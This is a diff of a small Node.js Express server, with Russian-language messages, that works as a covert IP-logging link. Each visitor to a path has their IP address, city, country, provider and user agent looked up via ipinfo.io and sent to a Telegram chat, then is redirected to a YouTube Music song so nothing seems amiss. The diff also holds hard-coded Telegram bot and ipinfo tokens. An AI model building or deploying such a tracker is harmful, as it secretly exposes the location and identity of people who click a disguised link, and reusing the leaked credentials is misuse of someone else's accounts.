@@ -1,10 +1,8 @@
 const express = require('express');
 const axios = require('axios');
-const fs = require('fs');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// 🔐 Telegram настройки
 const TELEGRAM_TOKEN = '8045162630:AAEritxdtynKLUG2mr-C0TMIyc0UcDnlKNY';
 const CHAT_ID = '1031226674';
 
@@ -20,45 +18,31 @@ app.get('/:id', async (req, res) => {
         const ipInfo = await axios.get(`https://ipinfo.io/${ip}?token=7a9eeeb48f8390`);
         const data = ipInfo.data;
 
-        const log = {
-            time: new Date().toISOString(),
-            ip: ip,
-            city: data.city,
-            region: data.region,
-            country: data.country,
-            org: data.org,
-            loc: data.loc,
-            timezone: data.timezone,
-            userAgent: userAgent
-        };
-
-        const logText = `
+        const message = `
 🥔 <b>Новый переход</b>
-🌍 <b>IP:</b> ${log.ip}
-📍 <b>Место:</b> ${log.city}, ${log.country}
-🏢 <b>Провайдер:</b> ${log.org}
-🕓 <b>Часовой пояс:</b> ${log.timezone}
-📱 <b>User-Agent:</b>
-${log.userAgent}
-`;
+🌍 <b>IP:</b> ${data.ip}
+📍 <b>Город:</b> ${data.city}, ${data.country}
+🏢 <b>Провайдер:</b> ${data.org}
+📱 <b>UA:</b> ${userAgent}
+        `;
 
-        // Отправка в Telegram (с HTML форматированием)
         await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
-            text: logText,
+            text: message,
             parse_mode: 'HTML'
+        }).catch((err) => {
+            console.error('Ошибка отправки в Telegram:', err.message);
         });
 
-        // Лог в файл
-        //fs.appendFileSync('log.txt', JSON.stringify(log) + '\n');
-
-        // Редирект на песню
         res.redirect('https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK');
     } catch (err) {
         console.error('Ошибка:', err.message);
         res.redirect('https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK');
     }
 });
+
+// Держим процесс живым
+setInterval(() => {}, 1000 * 60 * 5);
 
 app.listen(PORT, () => {
     console.log(`Сервер запущен на http://localhost:${PORT}`);
